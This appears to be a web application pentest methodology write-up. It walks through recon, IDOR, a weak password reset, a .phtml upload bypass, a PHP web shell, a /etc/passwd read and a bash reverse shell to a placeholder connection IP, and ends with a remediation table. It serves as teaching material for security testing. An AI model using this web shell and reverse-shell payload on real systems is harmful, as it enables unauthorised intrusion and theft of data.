# WEB APPLICATION PENTEST

---

## Recon and Enumeration
> Gather as much information about the target as possible without making assumptions 

### Port Scanning
- Check services: `nmap -sV -sC -p- [IP]` (scan can take 2-20 min approx)
  - Check for useful open ports
  - 22 (SSH), 3306 (MySQL) being two common vectors

### Exploring the Application
- Observe what's on page: nav bar, version numbers, dates, links, etc.
- Check HTTP response headers: `curl -I [IP]`
  - Check server & version (x-reference for known vulns)
  - Check Set-Cookie for stack info. (e.g PHPSESSID confirms PHP session management)
  - For example: port 3306 open + PHPSESSID + Apache = LAMP stack.

### Directory Enumeration
- Discover directories and files beyond front end nav: `gobuster dir -u [IP] -w [/PATH/TO/WORDLIST]`
  - Endpoints such as "/admin", "/api", "/reset", "/uploads", etc. 
  - APIs often expose data in ways the frontend doesn't
  - Reset mechanisms are often implemented insecurely 
  - Uploads can be a path to code execution

### Register an Account (if applicable)
- If pages require authentication, make an account.
- Note URLs as navigating: look for `id` params, etc. 

### Exploring APIs
- Endpoints?
- An unauthenticated user should *not* be able to discover internal API routes

--- 

## Vulnerability Identification
- **Injection**
- **Broken access**
- **Auth flaws**
- **Business logic flaws**

### IDOR Example
> Insecure Direct Object Reference vulns are one of the most common and frequently overlooked flaws in web apps.
- `http://website.com/profile.php?id=1` - An authenticated user may possibly access other users' profile data by modifying the `id` parameter.

#### Extracting Cookies
- Inspect the page > storage > cookies > select IP. This will show all the cookies listed.
- PHPSESSID example: `curl -s -b "PHPSESSID=[ID]" "[ADDRESS]" | grep -i "email"`
  - Check if works without verifying whether authorised to view.
- Check API endpoints again: `curl -s "[ADDRESS]/api/[ID]"`

- **Developers often assume users will only access their own resources** - Servers must verify authentication. This is frequently missing.

---

## Exploitation
- **Foothold**
- **Privilege escalation**
- **Code execution**

### Weak Password Reset Example
- Before guessing or bruteforcing (which could trigger account lockouts) - examine the sites password reset mechanism
- **Password reset flows are one of the most commonly broken features in web applications**
- Test flow of reset password form with own account - any publicly available tokens? Insecure responses?
- See what is returned when doing it with an email that isn't yours

#### Analysing Tokens
- Look for patterns
- Random? Weak space? 

> Chaining something like this together with a vulnerability, such as IDOR, is a powerful attack technique.. Each technique on its own is not enough, but when chained with other vulnerabilities, it can lead to a full compromise.

### Exploring with Auth
- Refer back to previous endpoints (e.g /admin) with new access. 
- Check for upload endpoints - an upload function at the hands of an admin is a powerful attack vector.
- Inspect upload links (`<input>`) to view client-side code.
  - `accept=`? (e.g .pdf, .docx)
  - This is a **client-side** validation - the server should also validate the file type.
  - If not, a direct HTTP request can be used to bypass the client-side validation.
  - Check for further endpoints revealed (e.g. /uploads/documents)

- Test upload restrictions: even if server-side validation fails, check how thorough with custom file, e.g:
  - `echo '<?php echo "PHP is executing"; ?>' > test.php`
  - A common bypass in this example (if Apache and PHP), is to mark the file as `.phtml`. Apache often processes these as PHP.
  - A common oversight is blocking dangerous extensions without including less common ones. 
  - Verify file upload by navigating to "upload successful" path, if applicable. 

### Remote Code Execution (RCE)
- A web shell is a small script that allows an attacker to execute arbitrary commands on the server. Creating a web shell as per the above examples:

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
  - This script checks for a `cmd` parameter in the URL. If present, passes the value to `shell_exec()` which runs the command on the operating system.

- Running commands examples:
  - `curl "[ADDRESS]/shell.phtml?cmd=whoami"`
  - `curl "[ADDRESS]/shell.phtml?cmd=id"`
  - `curl "[ADDRESS]/shell.phtml?cmd=hostname"`
  - `curl "[ADDRESS]/shell.phtml?cmd=uname+-a"`
- In the above example (Apache), if the commands are running as `www-data`, RCE has been achieved. This is the default user for Apache on many Linux distributions.

#### Reading Sensitive Files
- Since files can now be read on the server, check for account information:
  - `curl "[ADDRESS]/shell.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"`
- This enables further enumeration of config files to extract DB credentials.

#### Obtaining a Reverse Shell
- A web shell works, but is limited; each command is a separate HTTP request, there is no interactive session, and complex commands with special characters can be diffcult to pass through URL params. This is where a reverse shell comes in:
  - Set up a listener: `nc -lnvp 4444`
  - In a second terminal, trigger reverse shell through the web shell. URL-encode the payload to avoid issues with special characters: `curl "[ADDRESS]/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"`
  - The listener terminal should then respond: `Connection Received on [CONNECTION_IP] 48268`
  - Connection on listener terminal should now be the user. Try `whoami` to confirm. 
- From here, typically proceed to local enumeration and privilege escalation.

---

## Attack Chain / Reporting
- To report, document the entire chain of vulnerabilites, showing the client how each weakness contributed to the overall compromise. In this example:
  - Enumeration: Discovered the stack, its directory structure, an API endpoints, a password reset page, an uploads dir, and an admin panel.
  - Vulnerability identification: In this example using an IDOR. an `/api/user?id=` endpoint for example can allow enumerating all users, including admins.
  - Exploitation: Using the vulnerabilities identified to exploit. For example, password reset bypass.
  - Admin Access: Using compromised admin accounts, try to access administrator privileges or panels. 
  - RCE: Web shell/reverse shell. This gives command execution on the server.

### Remediation Summary

| Vulnerability | Severity | Remediation |
|---|---|---|
| IDOR on user profiles and API | High | Implement server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requested resource. |
| Password reset token exposed in the response | Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters. |
| Incomplete file extension blocklist | Critical | Use an allowlist rather than a blocklist. Only permit specific, expected extensions. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
| API endpoint disclosure | Medium | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users. |

---

## Notes
- **Enumeration is everything**. The vulnerabilities we exploited were discoverable because we took the time to map the application's structure, headers, endpoints, and behaviour before attempting exploitation.
- **Small flaws chain into big compromises**. No single issue here was exotic or particularly complex. IDOR, weak password resets, and upload bypasses are well-understood vulnerabilities. Their impact came from how they connected to each other.
- **Client-side restrictions are not security**. The file upload form used an accept attribute to restrict file types in the browser. The server-side check used a blocklist that missed alternative PHP extensions. Real security requires server-side validation with an allowlist approach.
- **Password reset mechanisms deserve careful attention**. They are complex to implement securely, and a single design flaw, like exposing the token in the response, can lead to account takeover.
- **Think like an attacker, report like a consultant**. Finding the vulnerabilities is half the job. Documenting them clearly with severity ratings and actionable remediation advice is what makes the engagement valuable to the client.
